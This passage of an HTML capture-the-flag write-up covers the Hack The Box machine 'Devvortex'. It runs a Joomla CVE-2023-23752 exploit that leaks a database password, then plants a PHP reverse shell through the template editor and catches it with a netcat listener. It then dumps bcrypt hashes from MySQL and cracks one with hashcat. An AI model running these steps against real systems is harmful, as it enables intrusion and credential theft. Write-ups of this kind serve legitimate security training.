+http://dev.devvortex.htb/logs/
+http://dev.devvortex.htb/modules/
+http://dev.devvortex.htb/plugins/
+http://dev.devvortex.htb/tmp/
+
+
+[+] Finding common backup files name
+[++] Backup files are not found
+
+[+] Finding common log files name
+[++] error log is not found
+
+[+] Checking sensitive config.php.x file
+[++] Readable config files are not found
+
+
+Your Report : reports/dev.devvortex.htb/</code></pre>
+<p id="ef03" class="pw-post-body-paragraph mi mj gr mk b ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf gk bj" data-selectable-paragraph=""><strong class="mk gs">Joomla v. 4.2.6</strong>. This version should be vulnerable to recent <a class="af oj" href="https://nvd.nist.gov/vuln/detail/CVE-2023-23752" rel="noopener ugc nofollow" target="_blank">CVE-2023–23752</a> (Data exfiltration). Surfing the web, I came across this very fine <a class="af oj" href="https://www.exploit-db.com/exploits/51334" rel="noopener ugc nofollow" target="_blank">exploit PoC</a> from <strong class="mk gs">exploit-db.com</strong></p>
+<p id="91b4" class="pw-post-body-paragraph mi mj gr mk b ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf gk bj" data-selectable-paragraph="">Let’s download and run it against the Joomla installation to exploit the webapp.</p>
+<pre class="language-bash line-numbers"><code>ruby exploit.rb http://dev.devvortex.htb 
+Users
+[649] lewis (lewis) - lewis@devvortex.htb - Super Users
+[650] logan paul (logan) - logan@devvortex.htb - Registered
+
+Site info
+Site name: Development
+Editor: tinymce
+Captcha: 0
+Access: 1
+Debug status: false
+
+Database info
+DB type: mysqli
+DB host: localhost
+DB user: lewis
+DB password: P4ntherg0t1n5r3c0n##
+DB name: joomla
+DB prefix: sd4fg_
+DB encryption 0</code></pre>
+<p>Let’s try to authenticate with the credentials we just exfiltrated.</p>
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup4.png" alt="Devvortex - HTB Writeup" width="537" height="281" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup4-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup4-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup4-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup4-lg.png 1024w"></figure>
+<p>Hurrah, <strong class="mk gs">we are in!</strong></p>
+<p>We saw that user <strong class="mk gs">lewis </strong>is super user, we have admin rights to the content. We can change <strong class="mk gs">PHP </strong>code how/where-ever we want. Our next stop is to land on the page where we can edit <strong class="mk gs">PHP </strong>code and get reverse shell to our host machine. For Joomla, we can find such page inside installed templates. For this, we need to surf through <strong class="mk gs">System -&gt; Templates -&gt; Administrator Templates.</strong></p>
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup5.png" alt="Devvortex - HTB Writeup" width="549" height="287" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup5-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup5-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup5-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup5-lg.png 1024w"></figure>
+<p>We have one templated installed. Open and observe it.</p>
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup6.png" alt="Devvortex - HTB Writeup" width="546" height="200" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup6-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup6-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup6-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup6-lg.png 1024w"></figure>
+<p>Click on 'New File' on the top and create 'rev.php' file. Then click on that file that you can find your left in the website.</p>
+<figure class="post__image"><img decoding="async" loading="lazy"  style="color: var(--text-primary-color); font-family: var(--editor-font-family); font-size: inherit; font-weight: var(--font-weight-normal);" src="https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup8.png" alt="Devvortex - HTB Writeup" width="548" height="288" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup8-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup8-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup8-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup8-lg.png 1024w"></figure>
+<p>Start netcat listener on the host machine <code>nc -lvnp 1337</code>, visit <a href="http://dev.devvortex.htb/templates/cassiopeia/rev.php&lt;code&gt;&lt;/code&gt;" target="_blank" class="extlink extlink-icon-5 "  title="sakibulalikhan" rel="noopener noreferrer">http://dev.devvortex.htb/templates/cassiopeia/rev.php</a> and wait for the sweet shell.</p>
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup9.png" alt="Devvortex - HTB Writeup" width="567" height="177" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup9-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup9-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup9-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup9-lg.png 1024w"></figure>
+<p><span data-slate-fragment="JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMmxldCdzJTIwdXBncmFkZSUyMG91ciUyMHNoZWxsJTIyJTJDJTIybWFya3MlMjIlM0ElNUIlNUQlMkMlMjJzZWxlY3Rpb25zJTIyJTNBJTVCJTVEJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyWk9TS2pWWlo2WWN2JTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyQ3Q4RmVuQnpmSEdSJTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyYUlJaHlmZEhKczFEJTIyJTdE">Let's upgrade our shell with this command.</span></p>
+<pre class="language-python line-numbers"><code>python3 -c "import pty;pty.spawn('/bin/bash')"</code></pre>
+<p>W<span data-slate-fragment="JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMmUlMjBzdGlsbCUyMGhhdmUlMjBsZXdpcyUyMGNyZWRlbnRpYWxzJTIwd2UlMjBmb3VuZCUyMGVhcmxpZXIlMjBtYXliZSUyMHdlJTIwY2FuJTIwc2VhcmNoJTIwdGhlJTIwZGF0YWJhc2UlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJMbU54Q1F5Wmh0Q0olMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjI2TENjWllPVDVnVTUlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJFd3FiRjlGNTB6NnglMjIlN0Q=">e still have lewis credentials we found earlier maybe we can search the database using the bellow command.</span></p>
+<pre class="language-bash line-numbers"><code>mysql -u lewis -p</code></pre>
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup10-2.png" alt="Devvortex - HTB Writeup" width="566" height="174" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup10-2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup10-2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup10-2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup10-2-lg.png 1024w"></figure>
+<p><span data-slate-fragment="JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMkxldHMlMjBsaXN0JTIwdGhlJTIwZGF0YWJhc2VzJTIwYXZhaWxhYmxlJTIwdG8lMjB1cyUyMiUyQyUyMm1hcmtzJTIyJTNBJTVCJTVEJTJDJTIyc2VsZWN0aW9ucyUyMiUzQSU1QiU1RCU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMjkyY0dXbk5zbEdUYiUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMnFmeEtxTUNOMTU0UCUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMnNPcFhIMnR2NU1oVSUyMiU3RA==">Lets list the databases available to us with bellow command.</span></p>
+<pre class="language-bash line-numbers"><code>SHOW DATABASES;</code></pre>
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup11.png" alt="Devvortex - HTB Writeup" width="537" height="227" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup11-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup11-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup11-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup11-lg.png 1024w"></figure>
+<p><span data-slate-fragment="JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMmpvb21sYSUyMGxvb2tzJTIwaW50ZXJlc3RpbmclMkMlMjBsZXQncyUyMHVzZSUyMHRoaXMlMjBkYXRhYmFzZSUyMiUyQyUyMm1hcmtzJTIyJTNBJTVCJTVEJTJDJTIyc2VsZWN0aW9ucyUyMiUzQSU1QiU1RCU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMmlTaVlEWDVNM1MzWCUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMmk2YU13V3ZFQUpLbSUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMjZFRzdJTFBBaHF1cSUyMiU3RA==">joomla looks interesting, let's use this database with bellow command.</span></p>
+<pre class="language-bash line-numbers"><code>USE joomla;</code></pre>
+<p>Then <span data-slate-fragment="JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMmxpc3QlMjBhbGwlMjB0aGUlMjB0YWJsZXMlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJBanVKQTVuNEtHWFIlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJwZTZqb3RBUVhUTEglMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJZSG9zYmxIZ1Y2U0klMjIlN0Q=">list all the tables with bellow command.</span></p>
+<pre class="language-bash line-numbers"><code>SHOW TABLES;</code></pre>
+<p><span data-offset-key="HNnPSthUylKw:0">we can see the following table </span><code class="r-crgep1 r-2jxp4q r-z2wwpe r-uibjmv r-m2pi6t r-1hvjb8t" data-slate-leaf="true" data-offset-key="HNnPSthUylKw:1" data-slate-fragment="JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMndlJTIwY2FuJTIwc2VlJTIwdGhlJTIwZm9sbG93aW5nJTIwdGFibGUlMjAlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlMkMlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMnNkNGZnX3VzZXJzJTIyJTJDJTIybWFya3MlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJtYXJrJTIyJTJDJTIydHlwZSUyMiUzQSUyMmNvZGUlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTdEJTVEJTJDJTIyc2VsZWN0aW9ucyUyMiUzQSU1QiU1RCU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMks4Z3hZOEJzTFFpUCUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMmZheTJ6aHNyR1F1byUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMnVtTzltY2ozUEwzWCUyMiU3RA==">sd4fg_users</code> with bellow command.</p>
+<pre class="language-bash line-numbers"><code>select username,password from sd4fg_users;</code></pre>
+<p><span data-slate-fragment="JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMmUlMjBoYXZlJTIwc29tZSUyMHVzZXJuYW1lcyUyMGFuZCUyMHRoZXJlJTIwZW5jcnlwdGVkJTIwcGFzc3dvcmRzJTIyJTJDJTIybWFya3MlMjIlM0ElNUIlNUQlMkMlMjJzZWxlY3Rpb25zJTIyJTNBJTVCJTVEJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyTFJtbDhJNlAzM0FmJTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyOFdnMjBoNFRVQjYwJTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyRXY1WG9mY0FOYzFVJTIyJTdE">We have some usernames and there encrypted passwords.....</span></p>
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup12.png" alt="Devvortex - HTB Writeup" width="570" height="173" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup12-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup12-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup12-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup12-lg.png 1024w"></figure>
+<p>Let's try to findout what type of password hash with hashid tool.</p>
+<pre class="language-bash line-numbers"><code>hashid -e '$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u'
+Analyzing '$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u'
+[+] Blowfish(OpenBSD) 
+[+] Woltlab Burning Board 4.x 
+[+] bcrypt</code></pre>
+<div>
+<div class="css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2">
+<div class="view_manYY blockWrapper_8BIg7 vertical0_jPhI0 horizontalAuto_xck7M">
+<div class="css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2 r-18u37iz r-1777fci" data-rnwr1490-1777fci="true" data-rnwr700-1777fci="true">
+<div class="css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2">
+<div class="css-175oi2r">
+<div class="css-175oi2r">
+<div class="view_manYY relative_kNGzo column_Pzect vertical400_IGNdU top400_n25lP bottom400_6eeBF" data-key="SvkuuZRoSLZ0">
+<div class="r-1oszu61 r-1xc7w19 r-1phboty r-1yadl64 r-deolkf r-6koalj r-eqz5dr r-crgep1 r-ifefl9 r-bcqeeo r-t60dpp r-bnwqim r-417010 r-1ro0kt6 r-16y2uox r-1wbh5a2" data-block-content="SvkuuZRoSLZ0">
+<div class="css-175oi2r">
+<div class="css-175oi2r">
+<ul>
+<li class="view_manYY relative_kNGzo column_Pzect vertical400_IGNdU top0_4AOU1 bottom0_fXfxl" data-key="gSWYuZDmWBPb">
+<div class="r-1oszu61 r-1xc7w19 r-1phboty r-1yadl64 r-deolkf r-crgep1 r-ifefl9 r-bcqeeo r-t60dpp r-417010 r-1ro0kt6 r-16y2uox r-1wbh5a2 r-6koalj r-18u37iz r-bnwqim" data-block-content="gSWYuZDmWBPb">
+<div class="css-175oi2r r-13awgt0">
+<div class="r-1oszu61 r-1xc7w19 r-1phboty r-1yadl64 r-deolkf r-6koalj r-1mlwlqe r-eqz5dr r-1q142lx r-crgep1 r-ifefl9 r-bcqeeo r-t60dpp r-bnwqim r-417010" data-key="t88OHsWBOXXd">
+<div class="css-1rynq56 r-gg6oyi r-ubezar r-1o2nx2a r-135wba7 r-37p410 r-fdjqy7 r-1xnzce8" dir="auto"><span data-key="uGnt8MruuD66">Blowfish(OpenBSD)</span></div>
+</div>
+</div>
+</div>
+</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div data-slate-fragment="JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJsaXN0LXVub3JkZXJlZCUyMiUyQyUyMmlzVm9pZCUyMiUzQWZhbHNlJTJDJTIyZGF0YSUyMiUzQSU3QiU3RCUyQyUyMm5vZGVzJTIyJTNBJTVCJTdCJTIyb2JqZWN0JTIyJTNBJTIyYmxvY2slMjIlMkMlMjJ0eXBlJTIyJTNBJTIybGlzdC1pdGVtJTIyJTJDJTIyaXNWb2lkJTIyJTNBZmFsc2UlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMkJsb3dmaXNoKE9wZW5CU0QpJTIyJTJDJTIybWFya3MlMjIlM0ElNUIlNUQlMkMlMjJzZWxlY3Rpb25zJTIyJTNBJTVCJTVEJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIycFpGdElTVGhRNXVWJTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIySnpHMUhCYmQ5dExYJTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyelFWNTlnTnVXZmFGJTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyOEl1eXd5MTlwWHg4JTIyJTdEJTJDJTdCJTIyb2JqZWN0JTIyJTNBJTIyYmxvY2slMjIlMkMlMjJ0eXBlJTIyJTNBJTIycGFyYWdyYXBoJTIyJTJDJTIyaXNWb2lkJTIyJTNBZmFsc2UlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJ0ZXh0JTIyJTJDJTIybGVhdmVzJTIyJTNBJTVCJTdCJTIyb2JqZWN0JTIyJTNBJTIybGVhZiUyMiUyQyUyMnRleHQlMjIlM0ElMjJMZXQncyUyMHVzZSUyMGhhc2hjYXQlMjBhbmQlMjBjcmFjayUyMHRoZSUyMHVzZXIlMjBsb2dhbiUyMGhhc2glMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJTNjNhdTY3OEppcGslMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJDUzZhQVFpdW55Y3clMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJMazRNYzNyTW5kcG0lMjIlN0Q=">
+<div class="css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2">
+<div class="view_manYY blockWrapper_8BIg7 vertical0_jPhI0 horizontalAuto_xck7M">
+<div class="css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2 r-18u37iz r-1777fci" data-rnwr1490-1777fci="true" data-rnwr700-1777fci="true">
+<div class="css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2">
+<div class="css-175oi2r">
+<div class="css-175oi2r">
+<div class="view_manYY relative_kNGzo column_Pzect vertical400_IGNdU top200_FwkHm bottom200_HuRwz" data-key="CS6aAQiunycw">
+<div class="r-1oszu61 r-1xc7w19 r-1phboty r-1yadl64 r-deolkf r-6koalj r-eqz5dr r-crgep1 r-ifefl9 r-bcqeeo r-t60dpp r-bnwqim r-417010 r-1ro0kt6 r-16y2uox r-1wbh5a2" data-block-content="CS6aAQiunycw">
+<div class="css-1rynq56 r-gg6oyi r-ubezar r-1o2nx2a r-135wba7 r-37p410 r-fdjqy7 r-1xnzce8" dir="auto"><span data-key="S63au678Jipk">Let's use hashcat and crack the user logan hash with bellow command.</span></div>
+<div dir="auto">
+<pre class="language-bash line-numbers"><code>hashcat -m 3200 logan_hash /usr/share/wordlists/rockyou.txt</code></pre>
+<p>W<span data-slate-fragment="JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMmUlMjBoYXZlJTIwdGhlJTIwY3JhY2tlZCUyMHBhc3N3b3JkJTIwb2YlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJnQkNVbTEyUFozOVklMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJTV2c5WlhaZ3FMR1MlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJDRHIwQkpuWU15SUslMjIlN0Q=">e have the cracked password of <code>logan</code>.</span></p>
+<pre class="language-bash line-numbers"><code>tequieromucho</code></pre>
+<p><span data-slate-fragment="JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMkxldHMlMjBzZWUlMjBpZiUyMHdlJTIwY2FuJTIwU1NIJTIwaW50byUyMHRoZSUyMG1hY2hpbmUlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJyQWZEbzV5UW1OMHUlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJaYXltVEJ2ZllxUHIlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjIxRUkzUThQM0tZVWglMjIlN0Q=">Let'